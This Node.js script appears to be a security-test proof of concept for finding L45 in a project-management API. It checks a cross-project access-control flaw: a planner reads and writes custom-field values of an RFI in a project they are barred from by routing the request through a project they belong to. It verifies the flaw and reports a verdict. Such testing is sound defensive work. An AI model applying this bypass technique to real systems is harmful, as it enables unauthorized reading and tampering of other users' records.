'use strict';
/**
 * L45 — Custom-field values are read/written by {orgId, recordType, recordId}
 * with no project or record check.
 *
 * The route guards module access on the URL's project (custom-fields.js
 * requireRecordAccess + nestedProjectAccess), but the service queries
 * customFieldValue by {orgId, recordType, recordId} and never loads the record
 * to confirm it belongs to the route's project (custom-field.service.js
 * getValues :662-667, setValues upsert on {recordId,fieldId} :700-703).
 *
 * Within one company (028) this lets a planning engineer who is NOT assigned to
 * project Q read and write the custom-field values of an RFI that lives in Q,
 * by addressing it through a project P the planner IS on. Expected 404.
 */
const { as } = require('../lib/api');
const { ATTACKER } = require('./_fib-constants');

const line = (s) => console.log(s);
const show = (label, res) => line(`${label} -> ${res.status} ${JSON.stringify(res.body?.error?.code || res.body?.data?.id || '').slice(0, 120)}`);
const SECRET = `planner-wrote-this-${Date.now()}`;
const FIELD_KEY = 'cert_l45_probe';

(async () => {
  const pm = as(ATTACKER.pm, ATTACKER.orgId);                 // company admin
  const planner = as('planner@c028.octapm-cert.test', ATTACKER.orgId); // planning_eng, project-confined
  const projectP = ATTACKER.project;                          // a project the planner is assigned to

  // ── PM ensures a company-scoped rfi custom field exists ──
  let field = (await pm.send('GET', '/company/custom-fields?recordType=rfi')).body?.data?.items?.find((f) => f.key === FIELD_KEY);
  if (!field) {
    const made = await pm.send('POST', '/company/custom-fields', { recordType: 'rfi', type: 'text', label: 'Cert L45 probe', key: FIELD_KEY });
    show('PM POST company custom field (rfi)', made);
    field = made.body.data;
  } else {
    line('company custom field already present');
  }

  // ── PM creates a fresh project Q the planner is NOT assigned to ──
  const projQ = (await pm.send('POST', '/projects', { name: `L45 isolated project ${Date.now()}` })).body.data;
  const projectQ = projQ.id;
  line(`fresh project Q = ${projectQ}`);

  // ── PM creates RFI R inside Q ──
  const rfi = (await pm.send('POST', `/projects/${projectQ}/rfi`, { subject: 'L45 RFI in isolated project', question: 'q' })).body.data;
  const rfiId = rfi.id;
  line(`RFI R = ${rfiId} (belongs to project Q)`);

  // R really is in Q and NOT in P (rfi loadRfi filters by projectId)
  const inQ = await pm.send('GET', `/projects/${projectQ}/rfi/${rfiId}`);
  const inP = await pm.send('GET', `/projects/${projectP}/rfi/${rfiId}`);
  line(`PM GET R via Q -> ${inQ.status}; PM GET R via P -> ${inP.status} (R is a Q record)`);

  // planner cannot reach project Q at all
  const plannerOnQ = await planner.send('GET', `/projects/${projectQ}/rfi/${rfiId}`);
  line(`planner GET R via its true project Q -> ${plannerOnQ.status} (${plannerOnQ.body?.error?.code || ''})`);

  // ── The attack: planner addresses the Q record through project P ──
  const read = await planner.send('GET', `/projects/${projectP}/custom-fields/values/rfi/${rfiId}`);
  show('planner GET values rfi/R via project P (expect 404)', read);

  const write = await planner.send('PUT', `/projects/${projectP}/custom-fields/values/rfi/${rfiId}`, { values: { [FIELD_KEY]: SECRET }, partial: true });
  show('planner PUT values rfi/R via project P (expect 404)', write);

  // ── The write landed on the Q record: PM reads it back through Q ──
  const back = await pm.send('GET', `/projects/${projectQ}/custom-fields/values/rfi/${rfiId}`);
  const storedValue = back.body?.data?.values?.[FIELD_KEY];
  line(`PM GET values via Q after planner's write -> ${back.status}, ${FIELD_KEY}=${JSON.stringify(storedValue)}`);

  const plannerLockedOutOfQ = plannerOnQ.status === 403;
  const readLeaked = read.status === 200; // should be 404: R is not in project P
  const writeLanded = write.status === 200 && storedValue === SECRET;

  const defect = plannerLockedOutOfQ && (readLeaked || writeLanded);
  line('');
  line(`planner is denied project Q directly: ${plannerLockedOutOfQ}`);
  line(`planner read R's values through project P: ${readLeaked}`);
  line(`planner's write through P landed on the Q record: ${writeLanded}`);
  process.exitCode = defect ? 2 : 0;
  line(
    `VERDICT L45: ${defect ? 'CONFIRMED' : 'NOT_REPRODUCED'} — ${
      defect
        ? "a planning engineer with no access to project Q read and wrote the custom-field values of a Q RFI by addressing it through project P; the values service never checks the record's project."
        : 'the values service refused the cross-project record or the planner was not actually confined.'
    }`,
  );
})().catch((e) => {
  console.error('ERROR', e.message);
  process.exitCode = 1;
});
